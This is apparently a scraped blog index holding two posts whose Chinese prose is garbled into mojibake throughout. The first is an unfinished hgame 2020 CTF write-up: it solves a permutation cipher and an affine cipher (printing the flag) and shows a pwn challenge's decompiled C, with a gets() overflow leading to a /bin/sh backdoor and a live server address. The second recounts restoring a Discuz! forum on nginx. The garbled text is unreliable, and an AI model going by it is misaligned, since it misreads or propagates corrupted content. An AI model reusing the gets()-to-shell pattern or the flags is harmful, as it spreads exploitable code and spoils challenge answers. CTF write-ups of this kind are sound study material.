è¿˜è¯•äº†ä¸€ä¸‹ï¼Œè¿™ä¸ª130æ¬¡ä¸€å¾ªç¯æ¥ç€emmmã€‚å°±è¿™æ ·ï¼Œå‘ç°rangeæ”¹åˆ°131å°±å‡ºç°ä¸¤ä¸ªäº†ã€‚ str_encrypted = r'Lm$jham{pUt+5Ige}!Au3Pem!TTi0n_R' str_decrypted = '' for _ in range(130): for i in location: str_decrypted += str_encrypted[i] if str_decrypted.startswith('hgame'): print(str_decrypted) str_encrypted = str_decrypted str_decrypted = '' ä¸å¯¹å”‰ï¼å¥½åƒæ²¡è¿™ä¹ˆç®€å•ã€‚é‡æ–°è¯•äº†ä¸€ä¸‹ä¹‹å‰çš„å‡ ä¸ªRua!!!ä¹‹åçš„ç»“æœï¼Œå‘ç°è¿™ä¸ªå˜æ¢ä¸å¯è¡Œemmmã€‚ å¿…é¡»æ˜¯è¿ç»­è¾“å…¥ä¸Šä¸€æ¬¡å‡ºæ¥çš„ç»“æœæ‰è¡Œã€‚ï¼ˆå¯èƒ½ç†è§£æœ‰è¯¯ Affineé¢˜ç›®ç»™äº†è¿™æ®µç”¨æ¥åŠ å¯†çš„ä»£ç ï¼Œç°åœ¨å°±æƒ³åŠæ³•è¿˜åŸå›å»æ‰¾flagå§ã€‚ #!/usr/bin/env python3 # -*- coding: utf-8 -*- import gmpy2 from secret import A, B, flag assert flag.startswith('hgame{') and flag.endswith('}') TABLE = 'zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM' MOD = len(TABLE) cipher = '' for b in flag: i = TABLE.find(b) if i == -1: cipher += b else: ii = (A*i + B) % MOD cipher += TABLE[ii] print(cipher) # A8I5z{xr1A_J7ha_vG_TpH410} æç¤ºäº†flagä»¥ hgame{ å¼€å¤´ï¼Œä»¥ } ç»“å°¾ï¼Œå¾ˆæ˜æ˜¾èƒ½çœ‹å‡ºæ¥{ } _è¿™ä¸‰ä¸ªå­—ç¬¦æ˜¯æ‰¾ä¸åˆ°è€Œç›´æ¥åŠ åˆ°cipheré‡Œçš„ã€‚ å®¹æ˜“å¾—åˆ° MOD=62ï¼Œäºæ˜¯ä¹æ€è·¯å°±æ˜¯ï¼Œåˆ©ç”¨ hgame ä¸ A8I5z çš„æ˜ å°„å…³ç³»ï¼ŒæŠŠAå’ŒBä¸¤ä¸ªå‚æ•°ç»™æ±‚è§£å‡ºæ¥ï¼Œå†æŠŠå‚æ•°iåè§£å‡ºæ¥ï¼Œæœ€åæŠŠflagè¿˜åŸã€‚ ç ä»£ç å§ã€‚ TABLE = 'zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM' MOD = len(TABLE) # 62 flag = 'hgame' cipher = '' for b in flag: i = TABLE.find(b) print(b, i) # æ±‚è§£å¾—åˆ°å¯¹åº”çš„i # h 12 # g 11 # a 7 # m 6 # e 18 str_encrypt = r'A8I5z{xr1A_J7ha_vG_TpH410}' iis = list(range(5)) i = 0 for letter in str_encrypt[0:5]: iis[i] = TABLE.index(letter) print(letter, iis[i]) i += 1 # æ±‚è§£å¾—åˆ°å¯¹åº”çš„ii # A 46 # 8 33 # I 43 # 5 30 # z 0 å¾—åˆ°äº†å­—æ¯å¯¹åº”çš„iå’Œiiï¼Œè€Œ**iä¸iiæ»¡è¶³å…³ç³» (A*i+B) % 62 = ii**ï¼Œä»è€Œå¯ä»¥æŠŠAã€Bè§£å‡ºæ¥ã€‚ æŸ¥äº†æŸ¥æ¨¡é€†è¿ç®—ï¼Œçœ‹äº†çœ‹è§‰å¾—æœ‰ç‚¹éº»çƒ¦emmm çŒœæƒ³Aã€Bä¸ä¼šå¤ªå¤§ï¼Œå¹²è„†ç›´æ¥éå†å¥½äº†ã€‚ã€‚ for A in range(1, 62): for B in range(1, 62): if (12*A+B) % 62 == 46 and (11*A+B) % 62 == 33 and (7*A+B) % 62 == 43 and(6*A+B) % 62 == 30 and(18*A+B) % 62 == 0: print(\"Yes: \", A, B) # Yes: 13 14 å¾—åˆ°A=13ï¼ŒB=14. æ¥ä¸‹æ¥è¿˜åŸflagã€‚ # Begin to decrypt... A = 13 B = 14 str_encrypt = 'xr1AJ7havGTpH410' str_decrypt = '' for letter in str_encrypt: ii = TABLE.index(letter) for i in range(62): temp = (A*i + B) % 62 if temp == ii: print(i, TABLE[i]) str_decrypt += TABLE[i] print(str_decrypt) # M4thu5EdiNcRYpt0 # So the flag is `hgame{M4th_u5Ed_iN_cRYpt0}`. è¿™é‡Œå…ˆæŠŠ_ç»™å»æ‰äº†ï¼Œæœ€åå†åŠ ä¸Šã€‚ äºæ˜¯ä¹flagå°±æ˜¯ï¼š hgame{M4th_u5Ed_iN_cRYpt0} çœ‹æ¥æœç„¶æ˜¯æ•°å­¦å•Š2333ï¼Œè¿˜æƒ³çœ‹çœ‹å¤§ä½¬ä»¬æ€ä¹ˆç”¨æ•°å­¦æ–¹æ³•è§£å‡ºæ¥çš„ã€‚ï¼ˆï¼ˆ å¦‚é¢˜ç›®æ‰€è¨€â€”â€” Some basic modular arithmeticâ€¦ Reference: ä¸€ç‚¹å…³äºæ¨¡é€†è¿ç®—çš„ä»‹ç»ï¼Œåé¢æœ‰ç©ºå†çœ‹çœ‹å§ï¼ˆx https://blog.csdn.net/lion19930924/article/details/61926019 PwnHard_AAAAAnc 47.103.214.163 20000 IDAåˆ†æä¸€æ³¢ï¼Œå‘ç°æ˜¯memcmpæ¯”è¾ƒï¼Œbackdoorå‡½æ•°é‡Œæ˜¯æ‰§è¡Œ/bin/shçš„ã€‚ å…¶ä¸­sä¸v5è·ç¦»ä¸º -31h-(-ACh)=123ï¼Œæ„é€ payloadå‘äº†ä¸ª\"0O0o\"è¿‡å»ï¼Œå‘ç°ä¹ˆå¾—ã€‚ int __cdecl main(int argc, const char **argv, const char **envp) { char s; // [esp+0h] [ebp-ACh] char v5; // [esp+7Bh] [ebp-31h] unsigned int v6; // [esp+A0h] [ebp-Ch] int *v7; // [esp+A4h] [ebp-8h] v7 = &amp;argc; v6 = __readgsdword(0x14u); alarm(8u); setbuf(_bss_start, 0); memset(&amp;s, 0, 0xA0u); puts(\"Let's 0O0o\\\\0O0!\"); gets(&amp;s); if ( !memcmp(\"0O0o\", &amp;v5, 7u) ) backdoor(); return 0; } 20200125æ›´æ–°ï¼š çœ‹äº†å®˜æ–¹WPï¼Œè‰ï¼ˆä¸€ç§æ¤ç‰©ï¼‰ï¼Œå¥½æ°”å•Šï¼Œ\\x00æŠŠå­—ç¬¦ä¸²è¯†åˆ«éš”æ–­äº†ã€‚ æœªå®Œå¾…ç»­ï¼ˆå¯èƒ½ä¼šå’•å’•å’•","path":"2020/01/23/CTF_Hgame2020/"},{"title":"å°æƒ³æ³• | é‡å»ºé‚£äº›å¹´åŸºäºDiscuz!ç³»ç»Ÿæ­å»ºçš„æ»¡æ˜¯å›å¿†çš„ç­çº§ç½‘ç«™","text":"2020å¹´ç¬¬ä¸€ç¯‡å“ˆï¼Œå…ˆç¥å¤§å®¶æ–°å¹´å¿«ä¹ï¼Œæ¯å¤©éƒ½æœ‰æ–°æ”¶è·å–µï¼ å“‡å‘œï¼ä»Šå¤©ç»ˆäºä¸‹äº†ä»Šå¹´çš„ç¬¬ä¸€åœºé›ªï¼Œè´¼æƒŠå–œ~ï¼ˆç„¶è€Œç§¯ä¸èµ·æ¥å•Šå˜¤å˜¤å˜¤ å‰è¨€ æœ€è¿‘æœŸæœ«è€ƒè¯•æœˆå¿™æ­»äº†ï¼Œåˆšè€ƒå®Œä¸€ç§‘ï¼Œéš¾å¾—æœ‰ç©ºæ¥æµªä¸€ä¸‹ã€‚è€ƒå®Œä¸€ç§‘æµªä¸¤å¤©ç„¶åä½œæ­»å¤ä¹ çš„æ˜¯æˆ‘äº†emmmå˜¤å˜¤å˜¤ã€‚ æœ‰ä¸€æ¬¡å’Œå¥¶å†°å†°èŠå¤©ï¼Œå›å¿†èµ·ä¹‹å‰æŠ˜è…¾è¿‡çš„ã€æ­å»ºè¿‡çš„å„ç§ç½‘ç«™ï¼Œè€Œåå°±æƒ³åˆ°äº†Nå¹´ä»¥å‰æ­å»ºçš„ç­çº§ç½‘ç«™ã€‚ ï¼ˆå¾ˆæ˜æ˜¾ï¼Œé‚£æ—¶å€™æä¾›ç½‘ç»œæœåŠ¡çš„å„ç§ç©ºé—´ã€åŸŸåä»€ä¹ˆçš„åˆ°ç°åœ¨æ²¡å‡ ä¸ªè¿˜èƒ½ç”¨çš„äº†ã€‚ 2017å¹´10æœˆçš„æ—¶å€™ï¼Œæˆ‘çš„é‚®ç®±çªç„¶æ”¶åˆ°äº†ä¸€å°æ¥è‡ªRed Hatçš„é‚®ä»¶ï¼Œæé†’æˆ‘OpenShift Online v2 End of Lifeäº†ã€‚â†“ é‚£æ—¶å€™æ„Ÿè§‰ç‰¹åˆ«æƒŠå–œï¼Œæ¯•ç«Ÿåˆ°é‚£æ—¶å·²ç»æ”¾åœ¨é‚£ä¸Šé¢å››äº”å¹´äº†ï¼Œæˆ‘éƒ½å·®ç‚¹å¿˜è®°å®ƒçš„å­˜åœ¨äº†ã€‚è™½ç„¶åŸŸåæ—©å°±ç‚¸äº†ï¼Œä½†æ˜¯è¿™ä¸ªå…è´¹çš„äº‘å¹³å°å±…ç„¶è¿˜åœ¨ï¼ˆè¿™ä¸ªè§’åº¦çœ‹æ¥ Red Hat è¿˜æ˜¯æŒºå¯é çš„233ï¼‰ã€‚ é‚£æ—¶å°±ç™»ä¸Šå»çœ‹äº†ä¸€ä¸‹ï¼Œå“‡å‘œæ•°æ®å±…ç„¶éƒ½è¿˜åœ¨ï¼Œé€šè¿‡é»˜è®¤çš„åŸŸåè¿˜è®¿é—®åˆ°äº†ç½‘ç«™ï¼Œäºæ˜¯å¥½æ€€å¿µå•Šï¼Œä¸ºäº†ç•™ä¸ªçºªå¿µå°±æˆªäº†ä¸ªå›¾ã€‚ Nå¹´å‰å…ˆå»ºäº†10ç­çš„ç­ç½‘è®ºå›ï¼Œï¼ˆåˆ†ç­åï¼‰åˆå»ºäº†ä¸ª8ç­çš„ç­ç½‘ã€‚ â€‹ å‡ å¤©ä¹‹åï¼Œæœä¸å…¶ç„¶ï¼ŒUnavailableäº†ã€‚ ä¸è¿‡è¿˜å¥½é‚£æ—¶å€™å°±æœ‰å¤‡ä»½çš„å¥½ä¹ æƒ¯ï¼ˆä¸æ˜¯ï¼‰ï¼Œè¯•äº†å‡ ä¸ªå¯†ç ç™»å½•è¿›äº†8ç­çš„ç­ç½‘ï¼Œç„¶åæŠŠæ•°æ®åº“ç»™å¤‡ä»½ä¸‹æ¥äº†ï¼Œä¸è¿‡ä¹Ÿåªå¤‡ä»½äº†æ•°æ®åº“ï¼Œé™„ä»¶å•Šå¤´åƒå•Šè¿™äº›å°±æ²¡å¤‡ä»½ä¸‹æ¥ã€‚10ç­çš„ç­ç½‘ï¼ˆæ›´æ˜¯ç”±äºè®°ä¸å¾—å¯†ç äº†ï¼‰å°±æ²¡æˆåŠŸå¤‡ä»½emmmã€‚ äºæ˜¯ç°åœ¨å°±è§‰å¾—æœ‰ç‚¹é—æ†¾ï¼Œé€šè¿‡phpMyAdminå…¶å®å¯ä»¥ç›´æ¥å¯¼å‡ºæ•°æ®åº“çš„ï¼›åœ¨é‡å»ºçš„æ—¶å€™çŸ¥é“é€šè¿‡ä¿®æ”¹æ•°æ®åº“å¯ä»¥æŠŠåˆ›å§‹äººå¯†ç ä¿®æ”¹çš„ã€‚ ä½†é‚£æ—¶å€™ä¸å¤§æ¸…æ¥šè¿™äº›ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯é‚£æ—¶è¿æœåŠ¡å™¨å¯†ç éƒ½ä¸è®°å¾—äº†ï¼ˆï¼ˆï¼ˆ æœ€è¿‘è¿™å‡ å¤©å°±æƒ³ï¼Œå¹²è„†è¯•ä¸€ä¸‹ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½é‡å»ºé‚£æ—¶å€™çš„ç­ç½‘å§ã€‚ é‡å»ºæŠ˜è…¾è®°è¾£é¸¡æœåŠ¡å™¨é…ç½®å‡ºäº†ä¸€å †é—®é¢˜ä¹‹å‰éƒ½æ²¡æœ‰è‡ªå·±åŠ¨æ‰‹åœ¨è£¸æœºä¸Šé…ç½®WEBç¯å¢ƒæ¥ç€ï¼ŒLinuxä¹Ÿæ²¡æœ‰å¤šå°‘ç»éªŒï¼Œäºæ˜¯ä¹ä¸Šæ‰‹å°±æ¯”è¾ƒç—›è‹¦ã€‚ ä¸‹é¢æ˜¯ä¸€å †åºŸè¯emmm ä¸æƒ³çœ‹å°±ç›´æ¥è·³è¿‡è¿™èŠ‚å§ã€‚ ç§ŸæœåŠ¡å™¨çš„æ—¶å€™å›¾çœäº‹ç›´æ¥è£…äº†PHPStudyï¼Œé‡Œé¢é›†æˆäº†LNMPç¯å¢ƒï¼Œç„¶åç½‘ç«™ä»€ä¹ˆçš„ç›´æ¥å¯ä»¥åœ¨ä¸Šé¢é…ç½®ã€‚ ä¹‹å‰æ­äº†å‡ ä¸ªæµ‹è¯•ç”¨çš„ç½‘ç«™ï¼Œè¿è¡Œéƒ½æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œèƒ½æ­£å¸¸è®¿é—®ã€‚ ç„¶è€Œè¿™æ¬¡æˆ‘å»ºäº†ä¸€ä¸ªæ–°çš„PHPç¯å¢ƒï¼Œæ‰“å¼€ç«¯å£ï¼Œè®¿é—®çš„æ—¶å€™å±…ç„¶æŠ¥403æ— æƒé™ï¼Œä½†æ˜¯å…¶ä»–çš„ç½‘ç«™éƒ½æ²¡è¿™ä¸ªé—®é¢˜ã€‚ çœ‹åˆ°ç½‘é¡µä¸Šæ˜¯nginxæŠ¥çš„é”™ï¼Œå¾ˆè‡ªç„¶æ€€ç–‘å°±æ˜¯å®ƒçš„é—®é¢˜ã€‚æ£€æŸ¥äº†ä¸€ä¸‹é…ç½®æ²¡å‘ç°é—®é¢˜ï¼Œäºæ˜¯é‡è£…äº†ä¸€ä¸‹ã€‚è¿™å›ç›´æ¥æŠ¥500å†…éƒ¨æœåŠ¡å™¨é”™è¯¯äº†ã€‚ï¼ˆæˆ‘æ„£ä½äº† çœ‹äº†ä¸€ä¸‹é”™è¯¯logï¼Œå‘ç°å¾ˆå¤šæ˜¯æ— æƒé™ï¼Œè¿˜æœ‰çš„æ‰¾ä¸åˆ°æ–‡ä»¶ï¼Ÿï¼Ÿï¼Ÿ å¤åˆ¶ç²˜è´´æœäº†ä¸€ä¸‹ï¼Œæ€€ç–‘æ˜¯åŠ¨æ€é“¾æ¥åº“çš„é—®é¢˜ï¼Œäºæ˜¯lnå°è¯•åˆ›å»ºé“¾æ¥ï¼Œç„¶è€Œä¸æˆåŠŸã€‚ ç„¶åä¸æƒ³ç®¡äº†ï¼Œå…³é—­nginxæœåŠ¡ï¼Œå¯åŠ¨apacheæœåŠ¡ï¼Œè¿™å›è¿˜æ˜¯403ï¼Œå…¶ä»–çš„ç½‘ç«™å°±æ²¡é—®é¢˜ï¼Œç»äº†ã€‚ æ¢å›nginxï¼Œå°†é…ç½®æ–‡ä»¶ä¸­çš„userç”±wwwæ›´æ”¹ä¸ºrootï¼Œå†è¯•å±…ç„¶å¥½äº†ï¼çœ‹æ¥æœç„¶æ˜¯æƒé™çš„é—®é¢˜ï¼Œç„¶è€Œæˆ‘ä¹‹å‰å¥½åƒå¹¶æ²¡æœ‰æ”¹è¿‡ä»€ä¹ˆé…ç½®ï¼Œä¹Ÿä¸æ¸…æ¥šwwwç”¨æˆ·ä¸ºå•¥å°±æ²¡æƒé™äº†ã€‚ rootæ¯•ç«Ÿä¸å¤ªå®‰å…¨å§ï¼Œäºæ˜¯åˆæ”¹äº†å›å»ï¼Œ403äº†ã€‚ ç™»å½•æœåŠ¡å™¨çœ‹äº†ä¸€ä¸‹ï¼Œå‡ ä¸ªç½‘ç«™ç›®å½•ä¸‹å°±åªæœ‰æ–°å»ºçš„è¿™ä¸ªç”¨æˆ·ç»„æ˜¯rootï¼Œä¿®æ”¹äº†ç›®å½•æƒé™ï¼Œå…è®¸othersæ‰§è¡Œï¼Œå†è®¿é—®ï¼Œæ²¡é—®é¢˜äº†ã€‚ ä½†å¾ˆå¥‡æ€ªå•Šä¸ºå•¥å°±ä¸è¡Œå•Šã€‚ äºæ˜¯åˆé‡è£…äº†ä¸€æ¬¡nginxï¼ŒåŒæ—¶è¿˜å¸æ‰äº†å®ƒçš„é˜²ç«å¢™ï¼Œè¿™æ¬¡æ²¡é—®é¢˜äº†emmmã€‚å†è£…å›é˜²ç«å¢™ï¼Œåˆç‚¸äº†ã€‚ WAFçš„é—®é¢˜å•Šã€‚ è¿™æ—¶å€™åå°æ”¹å‚æ•°ä¹Ÿæœ‰æŠ¥æ— æƒé™çš„ï¼Œå°±å¾ˆæ‡µé€¼ã€‚ äºæ˜¯å¹²è„†ç›´æ¥rebootå¥½äº†ã€‚ ï¼ˆæœ‰å¥è¯è¯´å¾—å¥½ï¼Œé‡å¯è§£å†³ç»å¤§éƒ¨åˆ†é—®é¢˜ è¿›å…¥åå°ï¼Œå…ˆå…³é—­nginxï¼Œé‡è£…WAFï¼Œå†å¼€å¯nginxã€‚è¿™å›ç»ˆäºæ²¡æ¯›ç—…äº†ã€‚ï¼ˆx é‡å»º8ç­ç­ç½‘é‡å»ºå…¶å®ç±»ä¼¼äºæ¬å®¶ï¼Œäºæ˜¯çœ‹äº†å‡ ç¯‡å…³äºDiscuz!æ¬å®¶çš„æ•™ç¨‹ï¼Œå‘ç°è·ä»Šéƒ½æœ‰ä¸€æ®µå†å²äº†ã€‚ å»å®˜æ–¹è®ºå›æ‰¾åˆ°äº†æœ€æ–°çš„X3.4ç‰ˆæœ¬çš„ä¸‹è½½é“¾æ¥ï¼Œå‘ç°æŒ‡å‘äº†giteeï¼Œåˆšå¼€å§‹è¿˜è§‰å¾—æœ‰ç‚¹æ„æ€ï¼Œç„¶è€Œå½“æˆ‘ç‚¹å¼€é“¾æ¥å‘ç°è¿æ¥ä¸ä¸ŠgiteeæœåŠ¡å™¨ï¼Œéš¾é“ç‚¸äº†ï¼Ÿï¼Ÿï¼Ÿæ¢äº†ä¸€ä¸ªç½‘ç»œï¼Œè¿ä¸Šäº†ã€‚ï¼ˆåæ§½ä¸€ä¸‹è¾£é¸¡å®½å¸¦ï¼Œä¼°è®¡æ˜¯DNSå‡ºäº†ç‚¹é—®é¢˜8 å•Šä¸æ˜¯ï¼ï¼ï¼ åˆ«æƒ³ç€å•¥éƒ½æƒ³è£…æœ€æ–°çš„ï¼Œå¾—å…ˆè€ƒè™‘ä½ è¦é‡å»º/æ¢å¤çš„ç³»ç»Ÿæ˜¯ä»€ä¹ˆç‰ˆæœ¬çš„å•Šï¼è¿˜è¦æ³¨æ„PHPçš„ç‰ˆæœ¬ï¼Œä»¥åŠè¯­è¨€ç¼–ç ï¼ˆGBK/UTF8/BIG5/ï¼Ÿï¼‰ï¼ˆå°±å› ä¸ºè¿™ä¸ªåˆ æ‰åˆé‡å»ºäº†å¥½å‡ ä¸ªç‰ˆæœ¬ è®ºå›çš„ç‰ˆæœ¬å¯ä»¥åœ¨ä½ å¤‡ä»½çš„æ•°æ®åº“.sqlæ–‡ä»¶å¤´éƒ¨æ³¨é‡Šé‡Œçœ‹åˆ°ã€‚ï¼ˆè¿™ä¸ªè¿˜æ˜¯åé¢é‡å»º10ç­ç­ç½‘æ—¶æ‰å‘ç°çš„ ä¸è¦åƒæˆ‘ä¸€æ ·è£…äº†å‘ç°ç”¨ä¸äº†å˜¤å˜¤å˜¤ã€‚ uploadæ–‡ä»¶å¤¹æ‰“åŒ…ä¼ åˆ°æœåŠ¡å™¨ä¸Šï¼Œè§£å‹ï¼Œç„¶åè®¿é—®ç½‘ç«™ã€‚ è‰æ€ä¹ˆåˆ403äº†ã€‚ æ£€æŸ¥äº†ä¸€ä¸‹æ–‡ä»¶å‘ç°æ˜¯rootæ‰€å±ï¼ŒåŸæ¥æ˜¯ä¹‹å‰ä¸€ç›´ä»¥rootèº«ä»½æ“ä½œçš„é—®é¢˜ï¼Œæ›´æ”¹ç”¨æˆ·ç»„ä¸ºwwwï¼Œè¿™å›èƒ½æ­£å¸¸è®¿é—®äº†ã€‚ æŒ‰ç…§å®‰è£…æµç¨‹å…¨æ–°å®‰è£…Discuz!ç³»ç»Ÿã€‚è¿™é‡Œçš„æ•°æ®åº“è¦è‡ªå·±æå‰å»ºå¥½ï¼Œè¡¨å‰ç¼€å’Œä½ è¦é‡å»ºçš„ä¸€è‡´ï¼Œä¸€èˆ¬å°±ä¸ç”¨æ›´æ”¹ã€‚ å®‰è£…å®Œæˆï¼Œè®¿é—®ä¸»é¡µæ˜¯é»˜è®¤çš„ç•Œé¢ã€‚ï¼ˆç•¥ï¼‰ æ ¹æ®å®˜æ–¹çš„æ¬å®¶æ•™ç¨‹ï¼ŒæŠŠutility/restore.phpæ–‡ä»¶ä¸Šä¼ åˆ°ç½‘ç«™çš„data/ç›®å½•ä¸‹ï¼Œå†æŠŠè¦æ¢å¤çš„æ•°æ®åº“æ•´ä¸ªç›®å½•ä¹Ÿä¸Šä¼ åˆ°data/ä¸‹ï¼Œç„¶åé€šè¿‡ç½‘ç«™åŸŸå/data/restore.phpè®¿é—®æ•°æ®æ¢å¤é¡µé¢ã€‚ ç„¶è€Œè¿™é‡Œæˆ‘è¢«è‡ªå·±çš„WAFç»™æ‹¦ä½äº†233ã€‚ å¼€äº†ç™½åå•å†å¯¼å…¥ï¼Œè¿™æ—¶å€™è¿‡äº†ä¸€æ®µæ—¶é—´æŠ¥504äº†emmmã€‚ï¼ˆæˆ‘åˆæ‡µäº†ï¼Œéš¾å¾—è®©æˆ‘è§åˆ°äº†å¥½å¤šé”™è¯¯é¡µé¢ï¼Œæˆ‘æ²¡äº‹çš„å˜¤å˜¤å˜¤ é‡è¯•ï¼Œå¦‚æ—§ï¼ŒåŒæ—¶å‘ç°cpuæ˜¯100%åœ¨è·‘çš„ï¼ˆå”‰æ€§èƒ½æœç„¶ä¸å’‹æ ·ã€‚ æœäº†å„ç§èµ„æ–™ï¼ŒæŠŠnginxçš„è¶…æ—¶å’ŒPHPæ‰§è¡Œæ—¶é—´éƒ½æ”¹äº†ï¼Œè¿˜æ˜¯504â€¦ çœ‹äº†ä¸€ä¸‹.sqlæ–‡ä»¶ï¼Œå¹²è„†ä¸ç”¨æ•´ä¸ªå·¥å…·ï¼Œç›´æ¥å¯¼å…¥mysqlå¥½äº†å•¦ã€‚ è™½ç„¶æœŸé—´è¿˜æŠ¥äº†å‡ ä¸ªé”™ï¼Œä½†è¿˜æ˜¯å¯¼å®Œäº†å‘¢ã€‚ è®¿é—®ä¸»é¡µï¼Œå“‡å¥½æƒŠå–œå•Šï¼Œä¹‹å‰çš„åˆ†ç±»ã€å¸–å­ä»€ä¹ˆéƒ½å›æ¥äº†ã€‚ ç”¨åŸå§‹çš„åˆ›å§‹äººè´¦å·ç™»å½•åå°ï¼Œæ›´æ–°ç¼“å­˜ã€‚ è¿™é‡Œä¹ŸæŠ˜è…¾äº†è€åŠå¤©ï¼Œä¸æ˜¯å®‰è£…è®ºå›ç³»ç»Ÿæ—¶å€™åˆ›å»ºçš„ï¼Œè€Œæ˜¯é‡å»ºçš„è€ç”¨æˆ·ã€‚ æ¯•ç«Ÿæ•´ä¸ªæ•°æ®åº“éƒ½æ”¹å›å»äº†å˜›ã€‚ è‡³äºå¿˜è®°å¯†ç ï¼Œemmmåé¢å†è¯´ã€‚ å†åˆ·æ–°ä¸»é¡µï¼Œè¿™å›æ•°æ®åŸºæœ¬èƒ½æ­£å¸¸è®¿é—®äº†ï¼Œé¡µé¢é…ç½®ä¹Ÿæ¢å¤åˆ°äº†ä¹‹å‰çš„çŠ¶æ€ã€‚ ï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰æ¢å¤logoã€faviconã€attachmentã€avatarã€pluginã€templateç­‰ã€‚ è¿™é‡Œç”±äºä¹‹å‰åªå¤‡ä»½äº†logoï¼Œå…¶ä»–æ•°æ®åŸºæœ¬æ²¡å¤‡ä»½ï¼ˆæˆ–è€…è¯´æˆ‘çš„ç¡¬ç›˜é‡Œæ²¡å¤‡ä»½ï¼‰emmmï¼Œå°±ä¹ˆçš„åŠæ³•äº†ã€‚ çœ‹äº†çœ‹ä¸Šé¢çš„å¸–å­ï¼Œå…¨æ˜¯é»‘å†å²å•Šâ€¦â€¦ï¼ˆé»‘è„¸.png ç”¨æˆ·æ•°æ®éƒ½æ¢å¤äº†ï¼Œç†è®ºä¸Šèƒ½ç”¨åŸæ¥çš„ä¿¡æ¯è¿›è¡Œç™»å½•ã€‚ ç„¶è€Œå›¾ç‰‡ä»€ä¹ˆçš„éƒ½æ²¡äº†ï¼Œä¹‹å‰å¾ˆå¤šå¤–é“¾çš„å›¾ç‰‡ã€æ’ä»¶éƒ½å¤±æ•ˆäº†ï¼Œå…¶å®é—®é¢˜ä¹Ÿä¸å¤§å§ã€‚ ä¸è¿‡èƒ½é‡å»ºäº†ä¹Ÿæ€»æ¯”æ²¡æœ‰è¦å¥½å‘€ï¼å˜»å˜»å˜»ã€‚ æ¯•ç«Ÿè¿™ä¸ªç‰ˆæœ¬æœ‰å¾ˆå¤šå®‰å…¨æ¼æ´äº†ï¼Œå‡ºäºå®‰å…¨è€ƒè™‘ï¼Œè¿™é‡Œå°±ä¸å…¬å¼€äº†å•¦ã€‚ é‡å»º10ç­ç­ç½‘ä¸Šé¢è¯´äº†äº‘å¹³å°End of Lifeçš„æ—¶å€™æ²¡æœ‰å¤‡ä»½è¿™ä¸ªæ•°æ®çš„ã€‚ ä½†æ˜¯æˆ‘æ‰¾éäº†ç¡¬ç›˜ï¼Œç»ˆäºç¿»å‡ºäº†é‚£æ—¶å€™å¤‡ä»½çš„éƒ¨åˆ†æ•°æ®ã€‚ æœ‰äº†ä¸Šé¢é‡å»ºçš„ç»éªŒï¼Œæœ¬ä»¥ä¸ºå°±å¾ˆè½»æ¾ä¸Šæ‰‹çš„ï¼Œæ²¡æƒ³åˆ°è¿˜æ˜¯é‡åˆ°äº†ä¸€å †é—®é¢˜ã€‚ é¦–å…ˆè¿˜æ˜¯ç‰ˆæœ¬çš„é—®é¢˜ã€‚ æœ¬ä»¥ä¸ºX3.2ç‰ˆæœ¬å·²ç»å¤Ÿè€äº†ï¼Œæ²¡æƒ³åˆ°è¿™é‡Œæœ€åä¸€ç›´å›é€€åˆ°äº†**X2ç‰ˆæœ¬**ï¼ˆå™— é¬¼æ‡‚å¾—æˆ‘é‡å»ºäº†å¤šå°‘æ¬¡ç½‘ç«™emmmm æœŸé—´æœ‰ä¸€æ¬¡æ˜¯PHPç‰ˆæœ¬é”™äº†ï¼Œæ¯•ç«Ÿä¹‹å‰çš„ç‰ˆæœ¬ä¸€èˆ¬åªæ”¯æŒ5.xæ¥ç€ï¼Œç„¶åæˆ‘è£…äº†7.xã€‚ æœ‰ä¸€æ¬¡æ˜¯MySQLæ•°æ®åº“ç‚¸äº†ï¼Œè£…å®Œä¹‹åä¸»é¡µéƒ½æ‰“ä¸å¼€ï¼Œç›´æ¥æŠ¥çš„database errorã€‚ç„¶åå¸æ‰äº†æ•°æ®åº“ï¼Œæ¢äº†è€ä¸€ç‚¹çš„ç‰ˆæœ¬ï¼Œå‘ç°è£…å¥½äº†æ°¸è¿œå¯åŠ¨ä¸äº†ã€‚æœ€åå‘ç°æ˜¯ä¹‹å‰å¸è½½æœ‰æ®‹ç•™ï¼Œç»äº†ã€‚æ¸…äº†ä¸€éæ®‹ç•™é‡è£…ï¼Œå†é‡å¯æœåŠ¡å°±å¥½äº†ã€‚ è¿˜æœ‰ä¸€æ¬¡æ˜¯Discuzç‰ˆæœ¬è£…çš„X2.5ï¼Œæœ¬æ¥æŒºå¼€å¿ƒçš„ï¼Œå¯¼å®Œæ•°æ®æ›´æ–°å®Œç¼“å­˜ï¼Œç‚¹å¼€å¸–å­å°±æŠ¥database errorï¼Œè¯´æ‰¾ä¸åˆ°æŸæŸè®°å½•å§ã€‚æœ€åç‰ˆæœ¬é™åˆ°X2ç»ˆäºå¥½äº†ï¼Œä¼°è®¡æ˜¯ç‰ˆæœ¬å‡çº§è¿‡ç¨‹ä¸­ä¿®æ”¹äº†è¿™éƒ¨åˆ†æ•°æ®åº“æˆ–æ“ä½œæ•°æ®åº“çš„ä»£ç å§ã€‚ è¿˜æœ‰æ¯ä¸€æ¬¡éƒ½é‡åˆ°äº†**.sqlå¯¼ä¸è¿›æ•°æ®åº“**çš„é—®é¢˜ï¼Œå› ä¸ºè¿™ä¸ªæ•°æ®åº“æ›´å¤§äº†ï¼Œå³ä½¿æ”¹äº†nginxå’ŒPHPçš„é…ç½®ï¼Œåœ¨ç½‘é¡µä¸Šå¯¼å…¥è¿˜æ˜¯æ°¸è¿œæŠ¥504ï¼Œæœ€åæ˜¯ä¸€è¾¹çœ‹ç€CPUçŠ¶æ€ï¼Œä¸€è¾¹ä»åå°å¯¼å…¥çš„ã€‚å‰ç«¯æŠ¥äº†504ï¼ŒCPUè¿˜åœ¨è·‘ï¼Œè™½ç„¶SQLè¿˜æŠ¥è¿‡å¥½å‡ ç§é”™ä½†æœ€åè¿˜æ˜¯å¯¼å…¥å®Œæˆäº†ã€‚ã€‚ï¼ˆæˆ‘å¤ªéš¾äº† å™¢è¿˜æœ‰é‚£ä¸ªåˆ›å§‹äººå¯†ç å¿˜äº†çš„é—®é¢˜ã€‚ 